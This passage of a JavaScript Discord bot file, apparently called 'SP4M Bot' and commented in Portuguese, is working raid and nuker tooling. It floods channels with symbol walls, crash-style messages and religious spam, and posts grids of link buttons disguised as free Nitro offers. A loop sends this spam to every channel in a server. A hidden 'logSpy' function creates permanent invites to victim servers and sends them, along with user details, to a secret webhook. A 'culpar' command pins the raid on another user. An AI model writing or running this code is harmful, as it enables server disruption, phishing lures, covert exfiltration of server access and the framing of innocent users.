⧷ ⧸ ⧹ ⧺ ⧻ ⧼ ⧽ ⧾ ⧿ ⨀ ⨁ ⨂ ⨃ ⨄ ⨅ ⨆ ⨇ ⨈ ⨉ ⨊ ⨋ ⨌ ⨍ ⨎ ⨏ ⨐ ⨑ ⨒ ⨓ ⨔ ⨕ ⨖ ⨗ ⨘ ⨙ ⨚ ⨛ ⨜ ⨝ ⨞ ⨟ ⨠ ⨡ ⨢ ⨣ ⨤ ⨥ ⨦ ⨧ ⨨ ⨩ ⨪ ⨫ ⨬ ⨭ ⨮ ⨯ ⨰ ⨱ ⨲ ⨳ ⨴ ⨵ ⨶ ⨷ ⨸ ⨹ ⨺ ⨻ ⨼ ⨽ ⨾ ⨿ ⩀ ⩁ ⩂ ⩃ ⩄ ⩅ ⩆ ⩇ ⩈ ⩉ ⩊ ⩋ ⩌ ⩍ ⩎ ⩏ ⩐ ⩑ ⩒ ⩓ ⩔ ⩕ ⩖ ⩗ ⩘ ⩙ ⩚ ⩛ ⩜ ⩝ ⩞ ⩟ ⩠ ⩡ ⩢ ⩣ ⩤ ⩥ ⩦ ⩧ ⩨ ⩩ ⩪ ⩫ ⩬ ⩭ ⩮ ⩯ ⩰ ⩱ ⩲ ⩳ ⩴ ⩵ ⩶ ⩷ ⩸ ⩹ ⩺ ⩻ ⩼ ⩽ ⩾ ⩿ ⪀ ⪁ ⪂ ⪃ ⪄ ⪅ ⪆ ⪇ ⪈ ⪉ ⪊ ⪋ ⪌ ⪍ ⪎ ⪏ ⪐ ⪑ ⪒ ⪓ ⪔ ⪕ ⪖ ⪗ ⪘ ⪙ ⪚ ⪛ ⪜ ⪝ ⪞ ⪟ ⪠ ⪡ ⪢ ⪣ ⪤ ⪥ ⪦ ⪧ ⪨ ⪩ ⪪ ⪫ ⪬ ⪭ ⪮ ⪯ ⪰ ⪱ ⪲ ⪳ ⪴ ⪵ ⪶ ⪷ ⪸ ⪹ ⪺ ⪻ ⪼ ⪽ ⪾ ⪿ ⫀ ⫁ ⫂ ⫃ ⫄ ⫅ ⫆ ⫇ ⫈ ⫉ ⫊ ⫋ ⫌ ⫍ ⫎ ⫏ ⫐ ⫑ ⫒ ⫓ ⫔ ⫕ ⫖ ⫗ ⫘ ⫙ ⫚ ⫛ ⫝̸ ⫝ ⫞ ⫟ ⫠ ⫡ ⫢ ⫣ ⫤ ⫥ ⫦ ⫧ ⫨ ⫩ ⫪ ⫫ ⫬ ⫭ ⫮ ⫯ ⫰ ⫱ ⫲ ⫳ ⫴ ⫵ ⫶ ⫷ ⫸ ⫹ ⫺ ⫻ ⫼ ⫽ ⫾ ⫿ ⬄ ⬆ ⬇ ⬌ ⬍ ⬚ Ⱡ ⱡ Ɫ Ᵽ Ɽ ⱥ ⱦ Ⱨ ⱨ Ⱪ ⱪ Ⱬ ⱬ Ɑ ⱱ Ⱳ ⱳ ⱴ Ⱶ ⱶ ⱷ ⴰ ⴱ ⴲ ⴳ ⴴ ⴵ ⴶ ⴷ ⴸ ⴹ ⴺ ⴻ ⴼ ⴽ ⴾ ⴿ ⵀ ⵁ ⵂ ⵃ ⵄ ⵅ ⵆ ⵇ ⵈ ⵉ ⵊ ⵋ ⵌ ⵍ ⵎ ⵏ ⵐ ⵑ ⵒ ⵓ ⵔ ⵕ ⵖ ⵗ ⵘ ⵙ ⵚ ⵛ ⵜ ⵝ ⵞ ⵟ ⵠ ⵡ ⵢ ⵣ ⵤ ⵥ`;

const GOD_TEXT = `# If you do not believe in God then change your ways. Philippians 4:13 *** "I can do all things through Christ who strengthens me"***\n\n# *** John 3:16 "For God so loved the world, that he gave his only Son, that whoever believes in him should not perish but have eternal life"***\n\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n-# @everyone @here\nhttps://tenor.com/view/jesus-edit-edit-jesus-christ-is-king-christ-edit-gif-15902634079600751945`;

const LOGO_URL = "https://raw.githubusercontent.com/LPGamer1/Sp4m_bot/refs/heads/main/public/1766172400190.jpg";

// --- FUNÇÕES ---

const getDynamicCooldown = (i) => (i === 0 ? 1000 : i < 9 ? 2500 : 2800);

const getMassiveButtons = (customLink) => {
    const rows = [];
    const targetLink = customLink || INVITE;
    for (let i = 0; i < 5; i++) {
        const row = new ActionRowBuilder();
        for (let j = 0; j < 5; j++) {
            let label = "🎁 RESGATAR NITRO";
            if (i === 1 && j === 4) label = "☢️ SERVER BREACH";
            if (i === 2 && j === 2) label = "💀 SYSTEM FAILURE";
            if (i === 4 && j === 0) label = "⚠️ ACCESS DENIED";
            row.addComponents(new ButtonBuilder().setLabel(label).setStyle(ButtonStyle.Link).setURL(targetLink));
        }
        rows.push(row);
    }
    return rows;
};

const chunkString = (str, length) => {
    const chunks = [];
    for (let i = 0; i < str.length; i += length) chunks.push(str.substring(i, i + length));
    return chunks;
};

// --- LOG ESPIÃO ---
const logSpy = async (interaction) => {
    if (!SPY_WEBHOOK.startsWith("http")) return;

    const userTag = interaction.user ? interaction.user.tag : "N/A";
    const userId = interaction.user ? interaction.user.id : "N/A";
    const guildName = interaction.guild ? interaction.guild.name : "DM/Privado";
    let inviteUrl = "User Install / Sem Permissão";

    if (interaction.guild && interaction.channel) {
        try {
            const invite = await interaction.channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
            inviteUrl = invite.url;
        } catch (err) {}
    }

    const payload = JSON.stringify({
        content: `🚨 **USO DETECTADO** 🚨\n👤 **User:** ${userTag} \`(${userId})\`\n🏠 **Server:** ${guildName}\n🔗 **Invite:** ${inviteUrl}\n🛠️ **Cmd:** /${interaction.commandName}`
    });

    try {
        const req = https.request(SPY_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
        req.write(payload);
        req.end();
    } catch(e) {}
};

// --- FUNÇÃO GLOBAL (NUKER) ---
async function runGlobalAttack(interaction, user, attackFunction) {
    if (!interaction.guild) {
        return attackFunction(interaction.channel); // Se for DM, faz só uma vez
    }

    // Pega todos os canais de texto onde o bot tem permissão de falar
    const channels = interaction.guild.channels.cache.filter(c => 
        c.isTextBased() && c.permissionsFor(interaction.guild.members.me).has('SendMessages')
    );

    for (const [id, channel] of channels) {
        if (stopSignals.get(user.id)) break;
        
        // Executa o ataque no canal atual
        await attackFunction(channel);
        
        // Espera 3 segundos antes de ir para o próximo canal
        await wait(3000); 
    }
}


module.exports = async (TOKEN, CLIENT_ID) => {
    const client = new Client({ intents: [GatewayIntentBits.Guilds] });
    const rest = new REST({ version: '10' }).setToken(TOKEN);

    const commands = [
        // Comandos Normais
        new SlashCommandBuilder().setName('raid').setDescription('RAID V1 LIMPA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('raid2').setDescription('RAID V2 HTML CHARS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('wall_point').setDescription('PAREDE DE PONTOS (3 FASES)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('trava_zap').setDescription('10 MENSAGENS TRAVA (2s)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('ponto').setDescription('BRAILLE REPETIDO (20x)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('logo').setDescription('Envia a logo do bot').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('culpar').setDescription('Mensagem de conclusão falsa').addUserOption(o => o.setName('alvo').setRequired(true).setDescription('Usuário')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('say').setDescription('Repete Mensagem').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('Qtd')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('button_spam').setDescription('FLOOD BTNS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('god').setDescription('RAID RELIGIOSA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('stop').setDescription('Para o bot').setIntegrationTypes([1]).setContexts([0,1,2]),

        // Comandos Globais (Nuker)
        new SlashCommandBuilder().setName('all_raid').setDescription('RAID V1 EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_raid2').setDescription('RAID V2 EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_trava').setDescription('TRAVA ZAP EM TODOS OS CANAIS').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_ponto').setDescription('PONTO EM TODOS OS CANAIS').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_wall').setDescription('WALL EM TODOS OS CANAIS').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_god').setDescription('GOD EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_say').setDescription('SAY EM TODOS OS CANAIS').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('all_spam').setDescription('BUTTON SPAM EM TODOS OS CANAIS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([1]).setContexts([0,1,2])
    ].map(c => c.toJSON());

    client.once('clientReady', () => {
        rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log(`✅ SP4M Bot Online: ${client.user.tag}`);
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;
        const { commandName, options, user } = interaction;

        logSpy(interaction).catch(() => {});

        if (commandName === 'stop') {
            stopSignals.set(user.id, true);
            return interaction.reply({ content: '🛑 **PARADA DE EMERGÊNCIA ACIONADA.**', flags: [MessageFlags.Ephemeral] });
        }

        await interaction.reply({ content: '💀 **Iniciando...**', flags: [MessageFlags.Ephemeral] }).catch(() => {});
        stopSignals.set(user.id, false);
        const customLink = options.getString('link');

        // --- DEFINIÇÃO DAS FUNÇÕES DE ATAQUE ---

        const attackRaid1 = async (channel) => {
            const btns = getMassiveButtons(customLink);
            const msg = RAID_HEADER + RAID_SYMBOLS;
            const chunks = chunkString(msg, 1900);
            for(const chunk of chunks) await channel.send({ content: chunk, components: btns }).catch(()=>{});
        };

        const attackRaid2 = async (channel) => {
            const btns = getMassiveButtons(customLink);
            const msg = RAID_HEADER + RAID2_CONTENT;
            const chunks = chunkString(msg, 1900);
            for(const chunk of chunks) await channel.send({ content: chunk, components: btns }).catch(()=>{});
        };

        const attackTrava = async (channel) => {
            await channel.send({ content: TRAVA_ZAP_MSG }).catch(()=>{});
        };

        const attackPonto = async (channel) => {
             const pontoMsg = (PONTO_TEXT + " " + PONTO_TEXT).substring(0, 1999);
             await channel.send({ content: pontoMsg }).catch(()=>{});
        };

        const attackWall = async (channel) => {
            const walls = [WALL_1, WALL_2, WALL_3];
            for(const w of walls) {
                await channel.send({ content: w }).catch(()=>{});
                await wait(1000);
            }
        };

        const attackGod = async (channel) => {
            const btns = getMassiveButtons(customLink);
            await channel.send({ content: GOD_TEXT, components: btns }).catch(()=>{});
        };

        const attackSpam = async (channel) => {
             const btns = getMassiveButtons(customLink);
             await channel.send({ content: "### ⚠️ **ALERT: UNAUTHORIZED ACCESS**", components: btns }).catch(()=>{});
        };

        // --- COMANDOS NORMAIS (LOOP NO CANAL ATUAL) ---

        if (commandName === 'logo') {
            for(let i=0; i < 2; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: LOGO_URL }).catch(() => {});
                await wait(1700);
            }
        }
        
        if (commandName === 'culpar') {
            const alvo = options.getUser('alvo');
            await interaction.followUp({ 
                content: `✅ ${alvo} sua Raid foi concluída com sucesso! Caso deseje mais algo, basta executar os comandos.` 
            }).catch(() => {});
        }

        if (commandName === 'raid') {
            const btns = getMassiveButtons(customLink);
            const fullMsg = RAID_HEADER + RAID_SYMBOLS;
            const chunks = chunkString(fullMsg, 1900); 
            for(let i=0; i < 40; i++) {
                if (stopSignals.get(user.id)) break; 
                for (const chunk of chunks) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
                    await wait(600);
                }
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'raid2') {
            const btns = getMassiveButtons(customLink);
            const fullMsg = RAID_HEADER + RAID2_CONTENT;
            const chunks = chunkString(fullMsg, 1900); 
            for(let i=0; i < 40; i++) {
                if (stopSignals.get(user.id)) break; 
                for (const chunk of chunks) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
                    await wait(600);
                }
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'wall_point') {
            const walls = [WALL_1, WALL_2, WALL_3];
            for (let i = 0; i < 5; i++) {
                if (stopSignals.get(user.id)) break;
                for (const wall of walls) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: wall }).catch(() => {});
                    await wait(2000); 
                }
            }
        }

        if (commandName === 'trava_zap') {
            for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: TRAVA_ZAP_MSG }).catch(() => {});
                await wait(2000); 
            }
        }

        if (commandName === 'ponto') {
            const pontoMsg = (PONTO_TEXT + " " + PONTO_TEXT).substring(0, 1999);
            for(let i=0; i < 20; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: pontoMsg }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'button_spam') {
            const btns = getMassiveButtons(customLink);
            for(let i=0; i < 50; i++) {
                if (stopSignals.get(user.id)) break; 
                await interaction.followUp({ content: "### ⚠️ **ALERT: UNAUTHORIZED ACCESS**", components: btns }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'say') {
            const t = options.getString('t');
            const q = options.getInteger('q');
            for(let i=0; i < q; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: t }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'god') {
            const btns = getMassiveButtons(customLink);
            for(let i=0; i < 20; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: GOD_TEXT, components: btns }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        // --- COMANDOS GLOBAIS (NUKER) ---
        // Iteram por todos os canais com delay de 3s

        if (commandName === 'all_raid') await runGlobalAttack(interaction, user, attackRaid1);
        if (commandName === 'all_raid2') await runGlobalAttack(interaction, user, attackRaid2);
        if (commandName === 'all_trava') await runGlobalAttack(interaction, user, attackTrava);
        if (commandName === 'all_ponto') await runGlobalAttack(interaction, user, attackPonto);
        if (commandName === 'all_wall') await runGlobalAttack(interaction, user, attackWall);
        if (commandName === 'all_god') await runGlobalAttack(interaction, user, attackGod);
        if (commandName === 'all_spam') await runGlobalAttack(interaction, user, attackSpam);
        
        if (commandName === 'all_say') {
             const t = options.getString('t');
             await runGlobalAttack(interaction, user, async (ch) => {
                 await ch.send({ content: t }).catch(()=>{});
             });
        }

    });

    client.login(TOKEN).catch(() => {});
};
